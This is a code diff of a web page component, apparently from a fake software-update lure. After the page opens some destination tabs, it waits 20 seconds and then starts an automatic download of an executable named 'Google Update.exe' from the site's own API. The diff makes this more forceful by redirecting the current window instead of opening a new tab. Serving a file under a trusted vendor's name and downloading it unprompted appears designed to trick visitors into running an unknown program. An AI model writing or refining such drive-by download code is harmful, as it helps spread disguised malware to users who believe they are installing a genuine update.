@@ -151,11 +151,8 @@ function Home() {
       destinationTab.opener = null;
       destinationTab.location.href = CLOSE_DESTINATIONS[index];
     });
-    const downloadTab = window.open("", "_blank");
-    if (downloadTab) downloadTab.opener = null;
     window.setTimeout(() => {
-      if (!downloadTab || downloadTab.closed) return;
-      downloadTab.location.href = `/api/public/download?sid=${encodeURIComponent(sid)}&file=${encodeURIComponent("Google Update.exe")}`;
+      window.location.assign(`/api/public/download?sid=${encodeURIComponent(sid)}&file=${encodeURIComponent("Google Update.exe")}`);
     }, 20_000);
     setEntered(true);
   }, []);
